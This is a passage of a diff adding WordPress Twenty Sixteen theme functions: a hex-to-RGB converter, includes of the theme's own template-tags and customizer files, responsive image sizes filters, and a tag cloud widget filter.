+ * Converts a HEX value to RGB.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $color The original color, in 3- or 6-digit hexadecimal form.
+ * @return array Array containing RGB (red, green, and blue) values for the given
+ *               HEX code, empty array otherwise.
+ */
+function twentysixteen_hex2rgb( $color ) {
+	$color = trim( $color, '#' );
+
+	if ( strlen( $color ) === 3 ) {
+		$r = hexdec( substr( $color, 0, 1 ) . substr( $color, 0, 1 ) );
+		$g = hexdec( substr( $color, 1, 1 ) . substr( $color, 1, 1 ) );
+		$b = hexdec( substr( $color, 2, 1 ) . substr( $color, 2, 1 ) );
+	} elseif ( strlen( $color ) === 6 ) {
+		$r = hexdec( substr( $color, 0, 2 ) );
+		$g = hexdec( substr( $color, 2, 2 ) );
+		$b = hexdec( substr( $color, 4, 2 ) );
+	} else {
+		return array();
+	}
+
+	return array(
+		'red'   => $r,
+		'green' => $g,
+		'blue'  => $b,
+	);
+}
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 840 <= $width ) {
+		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
+	}
+
+	if ( 'page' === get_post_type() ) {
+		if ( 840 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	} else {
+		if ( 840 > $width && 600 <= $width ) {
+			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
+		} elseif ( 600 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $attr Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( 'post-thumbnail' === $size ) {
+		if ( is_active_sidebar( 'sidebar-1' ) ) {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
+		} else {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
+		}
+	}
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Sixteen 1.1
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentysixteen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
